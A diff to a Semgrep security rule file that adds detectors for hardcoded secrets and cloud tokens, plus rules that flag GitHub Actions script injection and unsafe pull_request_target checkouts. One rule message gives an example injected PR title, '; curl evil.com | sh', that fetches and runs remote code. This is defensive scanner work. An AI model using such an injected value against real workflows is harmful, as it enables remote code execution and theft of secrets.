@@ -7,15 +7,172 @@
 #   - Python (ML/Data Science services and pipelines)
 #   - TypeScript / JavaScript (React frontends)
 #   - YAML (Kubernetes manifests, GitHub Actions workflows)
+#   - Generic patterns (secrets detection across all file types)
 #
 # Semgrep automatically skips rules whose language is not present in the
 # scanned repository, so it is safe to include all rules in every repo.
 #
 # Deduplicated from per-language templates:
 #   semgrep-kubernetes-operator.yaml, semgrep-python.yaml,
-#   semgrep-typescript.yaml
+#   semgrep-typescript.yaml, semgrep-generic.yaml
 
 rules:
+  # ==========================================================================
+  # SECTION 1: GENERIC SECRETS DETECTION — Applies to all file types
+  # ==========================================================================
+
+  - id: generic-hardcoded-secret
+    languages: [generic]
+    severity: ERROR
+    message: |
+      Potential hardcoded secret detected (CWE-798).
+
+      Pattern matches: password, passwd, pwd, secret, token, api_key, apikey, private_key
+
+      Security Risk: Credentials in source code are visible in:
+        - Git history (even if deleted later)
+        - Container images
+        - CI/CD logs
+        - Backup systems
+
+      Remediation: Use environment variables or secret management:
+        - Kubernetes: Use Secrets or SealedSecrets
+        - GitHub Actions: Use repository/organization secrets
+        - Local development: Use .env files (add to .gitignore)
+
+      If this is a test fixture or example:
+        - Add comment: # nosemgrep: generic-hardcoded-secret
+        - Or use obviously fake values: password = "REPLACE_ME"
+    patterns:
+      - pattern-regex: |-
+          (?i)(password|passwd|pwd|secret|token|api[_-]?key|private[_-]?key)\s*[:=]+\s*["'][^"']{8,}["']
+    metadata:
+      cwe: "CWE-798"
+      owasp: "A07:2021 - Identification and Authentication Failures"
+      category: "security"
+
+  - id: generic-aws-access-key
+    languages: [generic]
+    severity: ERROR
+    message: |
+      AWS Access Key ID detected (AKIA...).
+
+      Format: AKIA[0-9A-Z]{16}
+
+      Immediate Action:
+        1. Rotate this key in AWS IAM console immediately
+        2. Check CloudTrail for unauthorized access
+        3. Revoke any sessions using this key
+
+      Prevention:
+        - Use IAM roles for EC2/ECS/Lambda (no keys needed)
+        - Use IAM roles for service accounts (IRSA) in Kubernetes
+        - Store keys in AWS Secrets Manager or SSM Parameter Store
+        - Enable AWS CloudTrail for key usage monitoring
+
+      False Positive: If this is documentation/example, replace with:
+        AKIAIOSFODNN7EXAMPLE (official AWS example key)
+    pattern-regex: 'AKIA[0-9A-Z]{16}'
+    metadata:
+      cwe: "CWE-798"
+      category: "security"
+
+  - id: generic-aws-secret-access-key
+    languages: [generic]
+    severity: ERROR
+    message: |
+      AWS Secret Access Key detected.
+
+      Pattern: 40-character base64 string (often paired with AKIA... access key)
+
+      Immediate Action: Rotate both access key and secret key immediately.
+
+      Note: This may have false positives for other base64 strings.
+    pattern-regex: |-
+      (?i)(aws_secret_access_key|aws[_-]?secret)\s*[:=]\s*["'][A-Za-z0-9/+=]{40}["']
+    metadata:
+      cwe: "CWE-798"
+      category: "security"
+
+  - id: generic-private-key
+    languages: [generic]
+    severity: ERROR
+    message: |
+      Private key detected in code.
+
+      Security Risk: Private keys in source code compromise PKI security:
+        - SSL/TLS certificates (MITM attacks possible)
+        - SSH keys (unauthorized server access)
+        - Code signing certificates (malware distribution)
+
+      Remediation:
+        - Remove from code immediately
+        - Revoke and regenerate keypair
+        - Use Kubernetes TLS secrets or cert-manager for certificates
+        - Use SSH agent or credential managers for SSH keys
+
+      If this is documentation or a test fixture, consider suppressing the finding.
+    pattern-regex: '-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----'
+    metadata:
+      cwe: "CWE-798"
+      category: "security"
+
+  - id: generic-github-token
+    languages: [generic]
+    severity: ERROR
+    message: |
+      GitHub Personal Access Token detected.
+
+      Format: ghp_[A-Za-z0-9]{36} (classic) or github_pat_[A-Za-z0-9_]+ (fine-grained)
+
+      Immediate Action:
+        1. Revoke token at https://github.com/settings/tokens
+        2. Check audit log for unauthorized access
+        3. Rotate all tokens with same permissions
+
+      Prevention:
+        - Use GitHub Apps instead of PATs (scoped permissions, audit trail)
+        - Use GITHUB_TOKEN in Actions (automatic, scoped to workflow)
+        - Set token expiration (max 90 days)
+    pattern-regex: '(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]+)'
+    metadata:
+      cwe: "CWE-798"
+      category: "security"
+
+  - id: generic-slack-webhook
+    languages: [generic]
+    severity: ERROR
+    message: |
+      Slack Webhook URL detected.
+
+      Format: https://hooks.slack.com/services/T.../B.../...
+
+      Security Risk: Webhook URL allows posting to Slack channel (spam, phishing).
+
+      Remediation: Regenerate webhook in Slack workspace settings.
+    pattern-regex: 'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+'
+    metadata:
+      cwe: "CWE-798"
+      category: "security"
+
+  - id: generic-google-api-key
+    languages: [generic]
+    severity: ERROR
+    message: |
+      Google API Key detected.
+
+      Format: AIza[A-Za-z0-9_-]{35}
+
+      Immediate Action:
+        1. Revoke key in Google Cloud Console
+        2. Check usage logs for unauthorized requests
+        3. Rotate all API keys
+
+      Prevention: Use service accounts with IAM instead of API keys.
+    pattern-regex: 'AIza[A-Za-z0-9_-]{35}'
+    metadata:
+      cwe: "CWE-798"
+      category: "security"
 
   # ==========================================================================
   # SECTION 2: KUBERNETES RBAC SECURITY — Privilege Escalation Prevention
@@ -238,7 +395,7 @@ rules:
       Keys matching: password, passwd, secret, token, apiKey, privateKey
 
       Remediation: Move secrets to environment variables or secret management.
-    pattern-regex: |
+    pattern-regex: |-
       (?i)^[[:space:]]*(password|passwd|secret|token|api[_-]?key|private[_-]?key):[[:space:]]*["']?[^"'\s]{8,}
     metadata:
       cwe: "CWE-798"
@@ -280,6 +437,85 @@ rules:
     metadata:
       cwe: "CWE-798"
       category: "security"
+
+  - id: github-actions-script-injection
+    languages: [generic]
+    severity: ERROR
+    message: |
+      GitHub Actions expression injection in workflow run block (CWE-78).
+
+      Attack Vector: Attacker-controlled values from PR titles, issue bodies, branch names,
+      or commit messages are interpolated directly into shell commands:
+        run: echo "${{ github.event.pull_request.title }}"
+        # PR title: "; curl evil.com | sh"
+
+      Dangerous fields (attacker-controlled text):
+        - github.event.issue.title / body
+        - github.event.pull_request.title / body / head.ref
+        - github.event.comment.body
+        - github.event.review.body
+        - github.event.discussion.title / body
+        - github.event.head_commit.message
+        - github.head_ref
+
+      Safe fields (constrained values - do not flag):
+        - github.event.number, github.event.action, github.sha, github.actor
+
+      Remediation: Move to environment variable (shell handles escaping):
+        - name: Process PR
+          run: echo "$TITLE"
+          env:
+            TITLE: ${{ github.event.pull_request.title }}
+    patterns:
+      - pattern-regex: 'run:.*\$\{\{\s*github\.(head_ref|event\.(issue|pull_request|discussion|review|review_comment|comment)\.(title|body|head\.ref|head\.label)|event\.head_commit\.message|event\.commits\[\d+\]\.message)\s*\}\}'
+    paths:
+      include:
+        - ".github/workflows/*.yml"
+        - ".github/workflows/*.yaml"
+    metadata:
+      cwe: "CWE-78"
+      owasp: "A03:2021 - Injection"
+      category: "security"
+      references:
+        - "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections"
+
+  - id: github-actions-pull-request-target-checkout
+    languages: [generic]
+    severity: WARNING
+    message: |
+      Unsafe checkout in pull_request_target workflow (CWE-829).
+
+      Attack Vector: pull_request_target runs with WRITE token and access to secrets.
+      If the workflow checks out the PR head code, a malicious PR can:
+        1. Modify build scripts to steal secrets
+        2. Push malicious code with write permissions
+        3. Execute arbitrary commands with elevated privileges
+
+      Unsafe patterns (flag these):
+        ref: ${{ github.event.pull_request.head.sha }}
+        ref: ${{ github.event.pull_request.head.ref }}
+
+      Safe patterns (do not flag):
+        - No ref specified (defaults to base branch)
+        - ref: refs/pull/${{ github.event.number }}/merge
+        - ref: ${{ github.event.pull_request.base.sha }}
+
+      Remediation:
+        - Use artifact passing between workflows instead of direct checkout
+        - If checkout is needed, use merge commit: refs/pull/${{ github.event.number }}/merge
+        - Add persist-credentials: false to limit token scope
+    patterns:
+      - pattern-regex: 'pull_request_target'
+      - pattern-regex: 'ref:\s*\$\{\{.*pull_request\.head\.(sha|ref)\s*\}\}'
+    paths:
+      include:
+        - ".github/workflows/*.yml"
+        - ".github/workflows/*.yaml"
+    metadata:
+      cwe: "CWE-829"
+      category: "security"
+      references:
+        - "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/"
 
   # ==========================================================================
   # SECTION 5: GO SECURITY — Kubernetes Controllers & Operators
@@ -758,7 +994,7 @@ rules:
       - metavariable-pattern:
           metavariable: $VALUE
           patterns:
-            - pattern-regex: |
+            - pattern-regex: |-
                 ["'][^"']{8,}["']
     metadata:
       cwe: "CWE-798"
